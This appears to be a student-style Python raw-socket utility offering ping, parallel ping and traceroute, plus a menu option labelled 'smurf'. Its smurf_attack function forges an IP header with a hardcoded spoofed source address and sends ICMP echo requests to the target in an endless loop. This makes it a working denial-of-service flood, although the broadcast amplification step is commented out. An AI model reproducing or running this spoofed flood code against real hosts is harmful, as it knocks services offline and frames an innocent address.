import socket
import os
import struct
import time
import select
import random
import threading
import ipaddress
import sys

ICMP_ECHO_REPLY = 0
ICMP_DESTINATION_UNREACHABLE = 3
ICMP_ECHO_REQUEST = 8
ICMP_TIME_EXCEEDED = 11


def checksum(source: bytes):
    s = 0
    for i in range(0, len(source), 2):
        word = source[i] + (source[i + 1] << 8) if i + 1 < len(source) else source[i]
        s += word
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def create_packet(ident, seq):
    header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, 0, ident, seq)
    data = struct.pack("d", time.time())
    csum = checksum(header + data)
    header = struct.pack("bbHHh", 8, 0, csum, ident, seq)
    return header + data


def parse_header(recv_data):
    ip_header_len = (recv_data[0] & 0x0F) * 4
    icmp_header = recv_data[ip_header_len : ip_header_len + 8]
    icmp_type, code, csum, p_id, p_seq = struct.unpack("bbHHh", icmp_header)
    return ip_header_len, icmp_type, code, csum, p_id, p_seq


def get_broadcast_address(ip: str, mask: str = "/24"):
    net = ipaddress.IPv4Network(f"{ip}{mask}", strict=False)
    return str(net.broadcast_address)


def ping(dest_addr, timeout=1, seq=1, max_attempts=3):
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
        sock.settimeout(timeout)
        ident = random.getrandbits(16)
        packet = create_packet(ident, seq)
        sock.sendto(packet, (dest_addr, 1))

        attempts = 0
        while attempts < max_attempts:
            ready = select.select([sock], [], [], timeout)
            if not ready[0]:
                print(f"{dest_addr}: Request timed out (seq={seq})")
                return

            recv_data, addr = sock.recvfrom(1024)

            ip_header_len, icmp_type, code, csum, p_id, p_seq = parse_header(recv_data)

            if p_id == ident and p_seq == seq:
                time_sent = struct.unpack(
                    "d", recv_data[ip_header_len + 8 : ip_header_len + 16]
                )[0]
                rtt = (time.time() - time_sent) * 1000
                print(f"Reply from {addr[0]}: icmp_seq={p_seq} time={rtt:.2f} ms")
                return
            else:
                attempts += 1

            print(f"{dest_addr}: no valid reply (seq={seq})")


def parallel_ping(host, count=5, interval=1):
    try:
        seq = 1
        while True:
            threads = []
            for i in range(count):
                t = threading.Thread(target=ping, args=(host, 1, seq))
                threads.append(t)
                t.start()
                seq += 1
                time.sleep(interval)
            for t in threads:
                t.join()
    except KeyboardInterrupt:
        print("\n")


def traceroute(dest_addr, max_hops=30, timeout=2):
    print(f"Traceroute to {dest_addr}, max {max_hops} hops:")
    ttl = 1
    seq = 1
    id = random.getrandbits(16)

    while ttl <= max_hops:
        with socket.socket(
            socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP
        ) as send_sock:
            send_sock.settimeout(timeout)
            send_sock.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)

            packet = create_packet(id, seq)
            send_time = time.time()
            send_sock.sendto(packet, (dest_addr, 1))

            try:
                recv_data, addr = send_sock.recvfrom(1024)
                rtt = (time.time() - send_time) * 1000

                ip_header_len, icmp_type, code, csum, p_id, p_seq = parse_header(
                    recv_data
                )

                if icmp_type == ICMP_TIME_EXCEEDED:
                    print(f"{ttl:2d}  {addr[0]}  RTT={rtt:.2f} ms  (Time Exceeded)")
                elif icmp_type == ICMP_ECHO_REPLY:
                    time_sent = struct.unpack(
                        "d", recv_data[ip_header_len + 8 : ip_header_len + 16]
                    )[0]
                    real_rtt = (time.time() - time_sent) * 1000
                    print(f"{ttl:2d}  {addr[0]}  RTT={real_rtt:.2f} ms  (Echo Reply)")
                    break
                elif icmp_type == ICMP_DESTINATION_UNREACHABLE:
                    print(f"{ttl:2d}  {addr[0]}  (Destination Unreachable)")
                    break
                else:
                    print(f"{ttl:2d}  {addr[0]}  (ICMP type={icmp_type})")

            except socket.timeout:
                print(f"{ttl:2d}  *  Request timed out")

        ttl += 1
        seq += 1





def smurf_attack(dest_addr, count=100000, delay=0.001):
    try:

        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        # broadcast_addr = get_broadcast_address(dest_addr)
        # print(broadcast_addr)

        ident = random.getrandbits(16)
        icmp_packet = create_packet(ident, seq=1)

        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 20 + len(icmp_packet)
        ip_id = random.getrandbits(16)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_ICMP
        ip_check = 0
        ip_src = socket.inet_aton("10.120.154.154")  # ТУТ МЕНЯТЬ
        ip_dst = socket.inet_aton(dest_addr)

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (ip_ver << 4) + ip_ihl,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_src,
            ip_dst,
        )
        ip_check = checksum(ip_header)
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            (ip_ver << 4) + ip_ihl,
            ip_tos,
            ip_tot_len,
            ip_id,
            ip_frag_off,
            ip_ttl,
            ip_proto,
            ip_check,
            ip_src,
            ip_dst,
        )
        packet = ip_header + icmp_packet

        while True:
            #print(dest_addr)
            sock.sendto(packet, (dest_addr, 1))

        print("Smurf attack completed!")
    except KeyboardInterrupt:
        print("\n")
    finally:
        if "sock" in locals():
            sock.close()



if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Использование: python script.py <адрес>")
        sys.exit(1)
    address = sys.argv[1]
    print("Select util:")
    print("\t-- ping")
    print("\t-- traceroute")
    print("\t-- smurf")
    while True:
        command = input()
        match command:
            case "ping":
                parallel_ping(address)
            case "traceroute":
                traceroute(address)
            case "smurf":
                smurf_attack(address)
            case _:
                print("Unknown command")
